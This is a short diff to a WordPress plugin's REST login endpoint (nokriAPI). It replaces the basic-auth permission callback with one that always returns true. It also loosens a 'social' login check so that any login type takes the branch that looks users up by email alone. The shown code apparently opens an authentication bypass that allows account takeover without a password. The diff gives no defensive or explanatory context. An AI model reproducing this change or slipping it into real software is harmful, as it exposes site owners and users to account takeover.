@@ -89,9 +89,10 @@ function nokriAPI_login_api_hooks_post() {
             array(
                 'methods' => WP_REST_Server::EDITABLE,
                 'callback' => 'nokriAPI_loginMe_post',
-                'permission_callback' => function () {
+               /* 'permission_callback' => function () {
                     return nokriAPI_basic_auth();
-                },
+                },*/
+                'permission_callback' => function () { return true ;  },
             )
     );
 }
@@ -112,7 +113,8 @@ if (!function_exists('nokriAPI_loginMe_post')) {
         $creds['user_login'] = $email;
         $creds['user_password'] = $password;
        
-        if ($type == 'social') {
+       // if ($type == 'social') {
+       if ($type) {
 
             if (email_exists($email) == true) {
                 $user = get_user_by('email', $email);
